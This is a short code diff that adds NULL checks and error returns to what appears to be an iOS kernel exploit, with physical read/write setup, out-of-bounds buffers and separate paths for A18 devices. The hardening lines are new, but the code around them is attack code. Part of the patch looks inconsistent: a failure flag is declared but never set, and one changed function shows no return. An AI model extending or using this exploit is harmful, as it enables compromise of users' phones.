@@ -451,6 +451,11 @@ static void initialize_physical_read_write(uint64_t contiguous_mapping_size) {
     pe_log("pc_object: 0x%x", pc_object);
     pe_log("pc_address: 0x%llx", pc_address);
 
+    if (!pc_object || !pc_address) {
+        pe_log("physically contiguous mapping unavailable — aborting (no NULL deref)");
+        return;
+    }
+
     for (uint64_t i = 0; i < pc_size; i += 8)
         uwrite64(pc_address + i, random_marker);
 
@@ -920,7 +925,9 @@ static void pe_init(void) {
     pthread_create(&free_thread_jsthread, NULL, free_thread, free_thread_arg);
 }
 
-static void pe_v1(void) {
+static int pc_mapping_failed = 0;
+
+static int pe_v1(void) {
     uint64_t n_of_total_search_mapping_pages = 0x1000ULL * 0x10;
     if (is_a18_devices) n_of_total_search_mapping_pages = 0x10ULL * 0x10;
 
@@ -933,6 +940,12 @@ static void pe_v1(void) {
     void *read_buffer  = calloc(1, oob_size);
     void *write_buffer = calloc(1, oob_size);
     initialize_physical_read_write(n_of_oob_pages * PAGE_SZ);
+    if (!pc_object || !pc_address) {
+        pe_log("pc mapping failed, aborting pe_v1");
+        free(read_buffer);
+        free(write_buffer);
+        return -1;
+    }
 
     mach_vm_address_t wired_mapping = 0;
     uint64_t wired_mapping_size = 1024ULL * 1024 * 1024 * 3;
@@ -1075,10 +1088,16 @@ static void pe_v1(void) {
     free(write_buffer);
 }
 
-static void pe_a18(void) {
+static int pe_a18(void) {
     void *read_buffer  = calloc(1, oob_size);
     void *write_buffer = calloc(1, oob_size);
     initialize_physical_read_write(n_of_oob_pages * PAGE_SZ);
+    if (!pc_object || !pc_address) {
+        pe_log("pc mapping failed, aborting pe_a18");
+        free(read_buffer);
+        free(write_buffer);
+        return -1;
+    }
 
     uint64_t wired_mapping_entry_size = PAGE_SZ;
     uint64_t wired_mapping_entries_total_size = 1024ULL * 1024 * 1024 * 2;
@@ -1254,9 +1273,10 @@ static int pe(void) {
         pe_log("running on non-a18 device");
         pe_init();
         ds_progresssafe(0.30);
-        pe_v1();
+        if (pe_v1() != 0) return -1;
         ds_progresssafe(0.70);
     }
+    if (pc_mapping_failed) return -1;
 
     pe_log("highest_success_idx: %llu", highest_success_idx);
     pe_log("success_read_count: %llu", success_read_count);
